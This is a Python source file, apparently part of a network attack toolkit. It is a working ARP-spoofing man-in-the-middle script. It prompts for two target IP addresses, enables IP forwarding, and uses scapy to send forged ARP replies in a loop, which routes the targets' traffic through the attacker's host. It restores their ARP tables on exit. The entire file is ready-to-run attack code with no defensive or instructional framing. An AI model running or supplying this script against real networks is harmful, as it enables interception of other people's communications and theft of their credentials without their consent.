from pip._vendor.distlib.compat import raw_input
from scapy.all import *

from .utils import get_mac

try:
    interface = raw_input("Enter Desired Interface [eth0]: ")
    if interface == "":
        interface = "eth0"
    target1_ip = raw_input("[*] Enter target 1 IP: ")
    target2_ip = raw_input("[*] Enter target 2 IP: ")
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)

print("\n[*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def undo_arp():
    print("\n[*] Restoring Targets...")
    target1_mac = get_mac(target1_ip)
    target2_mac = get_mac(target2_ip)
    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)


def poison_arp(target1_mac, target2_mac):
    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst=target1_mac))
    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst=target2_mac))


def main():
    try:
        target1_mac = get_mac(target1_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Target 1 MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try:
        target2_mac = get_mac(target2_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Target 2 MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")
    while 1:
        try:
            poison_arp(target1_mac, target2_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            undo_arp()
            break


main()
